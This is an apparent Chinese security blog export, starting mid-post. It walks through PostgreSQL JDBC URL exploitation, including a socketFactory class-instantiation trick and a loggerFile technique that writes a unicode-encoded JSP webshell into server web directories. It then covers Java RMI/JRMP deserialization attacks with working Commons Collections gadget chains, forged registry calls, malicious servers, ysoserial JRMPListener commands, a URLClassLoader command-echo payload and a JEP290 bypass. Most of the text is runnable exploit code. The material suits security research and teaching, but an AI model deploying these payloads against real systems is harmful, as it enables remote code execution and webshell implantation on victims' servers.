public class AttackPgsqlsocketFactory &#123;    public static void main(String[] args) throws Exception &#123;        String URL = &quot;jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:8001/calc.xml&quot;;        DriverManager.registerDriver(new Driver());        Connection connection = DriverManager.getConnection(URL);        connection.close();    &#125;&#125;

调试
堆栈如下：
instantiate:62, ObjectFactory (org.postgresql.util)getSocketFactory:39, SocketFactoryFactory (org.postgresql.core)openConnectionImpl:184, ConnectionFactoryImpl (org.postgresql.core.v3)openConnection:51, ConnectionFactory (org.postgresql.core)&lt;init&gt;:225, PgConnection (org.postgresql.jdbc)makeConnection:466, Driver (org.postgresql)connect:265, Driver (org.postgresql)getConnection:664, DriverManager (java.sql)getConnection:270, DriverManager (java.sql)main:14, AttackPgsqlsocketFactory (org.example)

跟进getConnection方法之后，一直往下走

跟进connect方法，前面做了一定的判断之后，往下走

跟进parseURL方法，该方法是对jdbc字符串进行处理

以indexof?作为分割符，拿到properties参数，后续将结果保存为Properties对象返回

返回后继续往下走，跟进makeConnection方法，顾名思义就是要开始建立联系

跟进PgConnection方法

又进行了一次赋值之后，继续往下走

跟进openConnection方法

初始化一个ConnectionFactory对象之后，调用其openConnectionImpl方法，跟进去

跟进getSocketFactory方法，先从前面解析jdbc串时 return的Properties对象中，获取socketFactory的类名，也就是org.springframework.context.support.ClassPathXmlApplicationContext

之后调用instantiate对其实例化处理，也就是漏洞触发点

这里是一个任意类实例化的点，可以调用只有1个入参，参数类型为String的有参构造进行实例化
弹出计算器
loggerLevel&#x2F;loggerFilepoc
jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=\u003c\u0025\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u006f\u0070\u0065\u006e\u0020\u002d\u0061\u0020\u0063\u0061\u006c\u0063\u0075\u006c\u0061\u0074\u006f\u0072\u0022\u0029\u007d\u003b\u0025\u003e&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/she11.jspdriver=org.postgresql.Driver&amp;url=jdbc:postgresql://172.16.105.1/test/?loggerLevel=DEBUG&amp;loggerFile=../webapps/ROOT/static/555.jsp&amp;&lt;%! \uxxx\uxxx%&gt;&lt;%\uxxx%&gt; =&amp;user=test&amp;pwd=123123


这个点不算复杂的，是log功能写文件，只是提一下写shell需要注意的一个地方,文件内容在下图地方会有一个处理
这里构造数据包时可以通过unicode编码shell内容=来进行shell写入，通过本身代码逻辑，让=截断掉前面的shell内容绕过URLDecoder的处理。其他的方式应该也可以，只要让=第一次出现的位置位于shell内容后面或者shell内容中不存在会让URLDecoder.decode抛异常的字符即可。

例如
&lt;%! \uxxx\uxxx%&gt;&lt;%\uxxx%&gt;

H2h2配置
spring.h2.console.enabled=truespring.h2.console.settings.web-allow-others=true

而h2本身的console界面也是可以通过jdbc连接串来进行jndi利用的
https://www.cnblogs.com/CoLo/p/17051019.html#h2
先搁一下。。。。。。
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之RMI/JRMP反序列化漏洞</title>
    <url>/2025/01/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI-JRMP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[引用Java安全之RMI反序列化
攻击注册中心客户端与注册中心进行交互可以使用以下几种方式：

list
bind
rebind
unbind
lookup

这几种方法位于RegistryImpl_Skel.class文件中的dispatch方法中，如果存在readObject则可以进行反序列化攻击，具体方法内容可以自己去看一下
dispatch里面对应关系如下

0-&gt;bind
1-&gt;list
2-&gt;lookup
3-&gt;rebind
4-&gt;unbind

case1相关代码中没有readObject方法，所以无法利用
当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用
当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用
如果服务端存在cc1相关组件漏洞，那么就可以使用反序列化攻击（有cc依赖的话相关poc都可以使用）
注册中心上调用的是RegistryImpl_Skel.class文件中的dispatch方法里面的bind()，而在客户端上调用的是RegistryImpl_Stub里面的bind()方法
Pocbindcase 0:                try &#123;                    var11 = var2.getInputStream();                    var7 = (String)var11.readObject();                    var8 = (Remote)var11.readObject();                &#125; catch (IOException var94) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var94);                &#125; catch (ClassNotFoundException var95) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var95);                &#125; finally &#123;                    var2.releaseInputStream();                &#125;                var6.bind(var7, var8);                try &#123;                    var2.getResultStream(true);                    break;                &#125; catch (IOException var93) &#123;                    throw new MarshalException(&quot;error marshalling return&quot;, var93);                &#125;

下面的poc中并不是在执行bind方法的时候进行反序列攻击，而是在前面的readObject时进行的反序列化攻击，自己跟着走一下就知道了
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class ClientPoc &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        Remote r = Remote.class.cast(Proxy.newProxyInstance(                Remote.class.getClassLoader(),                new Class[] &#123; Remote.class &#125;, (InvocationHandler) o));        registry.bind(&quot;test&quot;,r);    &#125;&#125;

Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象
public T cast(Object obj) &#123;        if (obj != null &amp;&amp; !isInstance(obj))            throw new ClassCastException(cannotCastMsg(obj));        return (T) obj;    &#125;

unbind&amp;lookupcase 2:                try &#123;                    var10 = var2.getInputStream();                    var7 = (String)var10.readObject();                &#125; catch (IOException var89) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var89);                &#125; catch (ClassNotFoundException var90) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var90);                &#125; finally &#123;                    var2.releaseInputStream();                &#125;                var8 = var6.lookup(var7);case 4:                try &#123;                    var10 = var2.getInputStream();                    var7 = (String)var10.readObject();                &#125; catch (IOException var81) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var81);                &#125; catch (ClassNotFoundException var82) &#123;                    throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var82);                &#125; finally &#123;                    var2.releaseInputStream();                &#125;                var6.unbind(var7);

这两个case中也有readObject，但是和上面bind方法不一样的是只能够传入String类型，这里我们可以通过伪造连接请求进行利用，修改lookup方法代码使其可以传入对象，Registry_Stub的lookup方法内容如下：
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException &#123;        try &#123;            RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);            try &#123;                ObjectOutput var3 = var2.getOutputStream();                var3.writeObject(var1);            &#125; catch (IOException var18) &#123;                throw new MarshalException(&quot;error marshalling arguments&quot;, var18);            &#125;            super.ref.invoke(var2);            Remote var23;            try &#123;                ObjectInput var6 = var2.getInputStream();                var23 = (Remote)var6.readObject();            &#125; catch (IOException var15) &#123;                throw new UnmarshalException(&quot;error unmarshalling return&quot;, var15);            &#125; catch (ClassNotFoundException var16) &#123;                throw new UnmarshalException(&quot;error unmarshalling return&quot;, var16);            &#125; finally &#123;                super.ref.done(var2);            &#125;            return var23;        &#125; catch (RuntimeException var19) &#123;            throw var19;        &#125; catch (RemoteException var20) &#123;            throw var20;        &#125; catch (NotBoundException var21) &#123;            throw var21;        &#125; catch (Exception var22) &#123;            throw new UnexpectedException(&quot;undeclared checked exception&quot;, var22);        &#125;    &#125;

Poc如下：
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import sun.rmi.server.UnicastRef;import java.io.ObjectOutput;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.Operation;import java.rmi.server.RemoteCall;import java.rmi.server.RemoteObject;import java.util.HashMap;import java.util.Map;public class ClientPoc &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        Remote r = Remote.class.cast(Proxy.newProxyInstance(                Remote.class.getClassLoader(),                new Class[] &#123; Remote.class &#125;, (InvocationHandler) o));        // 获取ref        //registry.getClass().getSuperclass().getSuperclass()为registry对象的父类的父类        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();        fields_0[0].setAccessible(true);        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);        //获取operations        Field[] fields_1 = registry.getClass().getDeclaredFields();        fields_1[0].setAccessible(true);        Operation[] operations = (Operation[]) fields_1[0].get(registry);        // 伪造lookup的代码，去伪造传输信息        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);        ObjectOutput var3 = var2.getOutputStream();        var3.writeObject(r);        ref.invoke(var2);    &#125;&#125;

自己调试可以发现即使客户端这边没有显式调用lookup方法，但是服务端依然会走到RegistryImpl_Skel.class文件中的dispatch方法中

在服务端这边接受到的参数var2为一个类对象，强转为String对象会失败，但是在强转之前以前对var10进行反序列化了，会正常弹窗
var10 = var2.getInputStream();var7 = (String)var10.readObject();

攻击客户端注册中心攻击客户端此方法可以攻击客户端和服务端
对于注册中心来说，我们还是从这几个方法触发：

bind
unbind
rebind
list
lookup

除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 12345  CommonsCollections1 &#x27;calc&#x27;

exploit.JRMPListener：使用时搭配任意的gadget（如CommonCollections1）生成第二次反序列化的payload，并会在攻击机监听一个指定的端口
然后使用客户端去访问
import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,12345);        registry.list();    &#125;&#125;

就成功实现客户端的RCE

这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的
服务端攻击客户端服务端攻击客户端，大抵可以分为以下两种情景。
1.服务端返回参数为Object对象2.远程加载对象
服务端返回参数为Object对象在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以cc1为例
反序列化的利用点就是UnicastRef的unmarshalValue方法
恶意类LocalUser
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.HashMap;import java.util.Map;public class LocalUser extends UnicastRemoteObject implements User &#123;    public String name;    public int age;    public LocalUser(String name, int age) throws RemoteException &#123;        super();        this.name = name;        this.age = age;    &#125;    @Override    public Object getUser() &#123;        Object o = null;        try&#123;            Transformer[] transformers = new Transformer[]&#123;                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)            &#125;;            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);            HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();            map.put(&quot;value&quot;, &quot;b&quot;);            Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            o = ctor.newInstance(Target.class, transformedMap);        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;        return o;    &#125;&#125;

User接口
import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote &#123;    public Object getUser() throws RemoteException;&#125;

服务端
import java.rmi.AlreadyBoundException;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.concurrent.CountDownLatch;public class Server &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException &#123;        User liming = new LocalUser(&quot;liming&quot;,15);        Registry registry = LocateRegistry.createRegistry(1099);        registry.bind(&quot;user&quot;,liming);        //使用CountDownLatch保持服务运行        CountDownLatch latch=new CountDownLatch(1);        latch.await();    &#125;&#125;

客户端
import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIClient &#123;    public static void main(String[] args) throws Exception&#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        User user = (User) registry.lookup(&quot;user&quot;);        user.getUser();    &#125;&#125;

当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。(该过程在上一篇详细调试RMI流程中有分析过）此时将触发RCE

远程加载对象这个条件十分十分苛刻，在现实生活中基本不可能碰到。
当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。
具体可以参考这篇文章，利用条件太过于苛刻了：https://paper.seebug.org/1091/#serverrmi-server
java.security.policy这个默认是没有配置的，需要我们手动去配置
攻击服务端上面有介绍通过注册中心来攻击客户端的方法，同样的方法也可以攻击服务端，但是用处不大，下面介绍的是客户端攻击服务端的方式
服务端的远程方法存在Object参数如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端
添加一个addUser方法，接受的是Object类型的参数
import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote &#123;    public Object getUser() throws RemoteException;    public void addUser(Object user) throws RemoteException;&#125;

当客户端调用这个方法的时候，服务端会对传递过来的参数进行反序列化
客户端
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class RMIClient &#123;    public static void main(String[] args) throws Exception&#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        map.put(&quot;value&quot;, &quot;b&quot;);        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object o = ctor.newInstance(Target.class, transformedMap);        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        User user = (User) registry.lookup(&quot;user&quot;);        user.addUser(o);    &#125;&#125;

服务端处成功弹窗
远程加载对象和上边Server打Client一样利用条件非常苛刻。
参考：https://paper.seebug.org/1091/#serverrmi
利用URLClassLoader实现回显攻击攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端
远程demo:
import java.io.BufferedReader;import java.io.InputStreamReader;public class ErrorBaseExec &#123;    public static void do_exec(String args) throws Exception    &#123;        //Process对象：用于获取命令执行的输入、输出或错误流        Process proc = Runtime.getRuntime().exec(args);        //proc.getInputStream()：获取子进程（命令）执行后的标准输出流        //BufferedReader 和 InputStreamReader：将子进程输出的字节流逐行读取并存储        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));        StringBuffer sb = new StringBuffer();        String line;        //每次读取一行，将其拼接到StringBuffer中，最终获取完整的输出内容        while ((line = br.readLine()) != null)        &#123;            sb.append(line).append(&quot;\n&quot;);        &#125;        //构造异常并抛出        String result = sb.toString();        Exception e=new Exception(result);        throw e; //将异常抛出到调用方法的位置    &#125;&#125;

该份代码的核心是执行系统命令并将执行结果作为异常信息抛出
在同一级目录下面通过下面两个命令制作成jar包
javac ErrorBaseExec.javajar -cvf RMIexploit.jar ErrorBaseExec.class

客户端POC:
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URLClassLoader;import java.rmi.Remote;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.HashMap;import java.util.Map;public class ClientPoc &#123;    public static Constructor&lt;?&gt; getFirstCtor(final String name)            throws Exception &#123;        final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];        ctor.setAccessible(true);        return ctor;    &#125;    public static void main(String[] args) throws Exception &#123;        String ip = &quot;127.0.0.1&quot;; //注册中心ip        int port = 1099; //注册中心端口        String remotejar = &quot;file:///E:\\mycode\\java_max\\lab_3\\RMIClient\\src\\main\\java\\RMIexploit.jar&quot;;        String command = &quot;whoami&quot;;        final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;        try &#123;            final Transformer[] transformers = new Transformer[] &#123;                    new ConstantTransformer(java.net.URLClassLoader.class),                    new InvokerTransformer(&quot;getConstructor&quot;,                            new Class[] &#123; Class[].class &#125;,                            new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),                    new InvokerTransformer(&quot;newInstance&quot;,                            new Class[] &#123; Object[].class &#125;,                            new Object[] &#123;                                    new Object[] &#123;                                            new java.net.URL[] &#123; new java.net.URL(remotejar) &#125;                                    &#125;                            &#125;),                    new InvokerTransformer(&quot;loadClass&quot;,                            new Class[] &#123; String.class &#125;,                            new Object[] &#123; &quot;ErrorBaseExec&quot; &#125;),                    new InvokerTransformer(&quot;getMethod&quot;,                            new Class[] &#123; String.class, Class[].class &#125;,                            new Object[] &#123; &quot;do_exec&quot;, new Class[] &#123; String.class &#125; &#125;),                    new InvokerTransformer(&quot;invoke&quot;,                            new Class[] &#123; Object.class, Object[].class &#125;,                            new Object[] &#123; null, new String[] &#123; command &#125; &#125;)            &#125;;            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;value&quot;, &quot;value&quot;);            Map outerMap = TransformedMap.decorate(innerMap, null,                    transformedChain);            Class cl = Class.forName(                    &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Target.class, outerMap);            Registry registry = LocateRegistry.getRegistry(ip, port);            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)                    .newInstance(Target.class,                            outerMap);            Remote r = Remote.class.cast(Proxy.newProxyInstance(                    Remote.class.getClassLoader(),                    new Class[] &#123; Remote.class &#125;, h));            registry.bind(&quot;liming&quot;, r);        &#125; catch (Exception e) &#123;            try &#123;                System.out.print(e.getCause().getCause().getCause().getMessage());            &#125; catch (Exception ee) &#123;                throw e;            &#125;        &#125;    &#125;&#125;

执行后成功返回

JEP290及其绕过JEP290介绍JEP290机制是用来过滤传入的序列化数据，以提高安全性，在反序列化的过程中，新增了一个filterCheck方法，所以，任何反序列化操作都会经过这个filterCheck方法，利用checkInput方法来对序列化数据进行检测，如果有任何不合格的检测，Filter将返回REJECTED。但是jep290的filter需要手动设置，通过setObjectInputFilter来设置filter，如果没有设置，还是不会有白名单
private static Status registryFilter(FilterInfo var0) &#123;        if (registryFilter != null) &#123;            Status var1 = registryFilter.checkInput(var0);            if (var1 != Status.UNDECIDED) &#123;                return var1;            &#125;        &#125;        if (var0.depth() &gt; (long)REGISTRY_MAX_DEPTH) &#123;            return Status.REJECTED;        &#125; else &#123;            Class var2 = var0.serialClass();            if (var2 == null) &#123;                return Status.UNDECIDED;            &#125; else &#123;                if (var2.isArray()) &#123;                    if (var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; (long)REGISTRY_MAX_ARRAY_SIZE) &#123;                        return Status.REJECTED;                    &#125;                    do &#123;                        var2 = var2.getComponentType();                    &#125; while(var2.isArray());                &#125;                if (var2.isPrimitive()) &#123;                    return Status.ALLOWED;                &#125; else &#123;                    return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;                &#125;            &#125;        &#125;    &#125;

也就是说只有以下几种类能够反序列化
String.classRemote.classProxy.classUnicastRef.classRMIClientSocketFactory.classRMIServerSocketFactory.classActivationID.classUID.class

JEP290本身是JDK9的产物，但是Oracle官方做了向下移植的处理，把JEP290的机制移植到了以下三个版本以及其修复后的版本中：

Java™ SE Development Kit 8, Update 121 (JDK 8u121)
Java™ SE Development Kit 7, Update 131 (JDK 7u131)
Java™ SE Development Kit 6, Update 141 (JDK 6u141)

以8u131作为测试

会被拦截，并返回REJECTED
绕过绕过的思路在上一篇RMI的文章中讲过了，就是利用类UnicastRef
来看看yso中的JRMPClient：
package ysoserial.payloads;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( &#123;    &quot;restriction&quot;&#125; )@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)@Authors(&#123; Authors.MBECHLER &#125;)public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; &#123;    public Registry getObject ( final String command ) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#x27;:&#x27;);        if ( sep &lt; 0 ) &#123;            port = new Random().nextInt(65535);            host = command;        &#125;        else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;            Registry.class        &#125;, obj);        return proxy;    &#125;    public static void main ( final String[] args ) throws Exception &#123;        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());        PayloadRunner.run(JRMPClient.class, args);    &#125;&#125;

其中的代码：
ObjID id = new ObjID(new Random().nextInt()); // RMI registryTCPEndpoint te = new TCPEndpoint(host, port);UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;	Registry.class&#125;, obj);return proxy;

返回了一个代理对象，上面代码中用到的类全部都在白名单，注册中心反序列化时，会调用到RemoteObjectInvacationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvacationHandler没有readObject方法），在readObject里的最后一行会调用ref.readExternal方法，并将ObjectInputStream传进去：

我们知道ref是UnicastRef，所以会调用该类中的readExternal方法
public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123;    this.ref = LiveRef.read(var1, false);&#125;

调用了LiveRef中的read方法

这里在上边会把LiveRef对象还原，LiveRef对象中存了我们序列化进去的ip和端口，之后会调用DGCClient#registerRefs
static void registerRefs(Endpoint var0, List&lt;LiveRef&gt; var1) &#123;        DGCClient.EndpointEntry var2;        do &#123;            var2 = DGCClient.EndpointEntry.lookup(var0);        &#125; while(!var2.registerRefs(var1));    &#125;

会调到DGCClient#makeDirtyCall，并把var2传进去，var2里封装了我们的endpoint信息
Lease var7 = this.dgc.dirty(var4, var2, new Lease(DGCClient.vmid, DGCClient.leaseValue));

最后就是我们自己创建了的dgc会调用dirty方法（中间的流程在RMI那篇文章写的挺透彻的了），var4是我们传进去的ObjID对象，var1是一个HashSet对象，里边存了我们的Endpoint信息
public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException &#123;        try &#123;            RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);            try &#123;                ObjectOutput var6 = var5.getOutputStream();                var6.writeObject(var1);                var6.writeLong(var2);                var6.writeObject(var4);            &#125; catch (IOException var20) &#123;                throw new MarshalException(&quot;error marshalling arguments&quot;, var20);            &#125;            super.ref.invoke(var5);          try &#123;                ObjectInput var9 = var5.getInputStream();                var24 = (Lease)var9.readObject();

这里wirteObject后，会用invoke将数据发出去，接下来从socket连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置filter，所以这里可以直接导致注册中心rce，所以我们可以伪造一个socket连接并把我们恶意序列化的对象发过去
用ysoserial启动一个恶意的服务端
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;

对应客户端代码
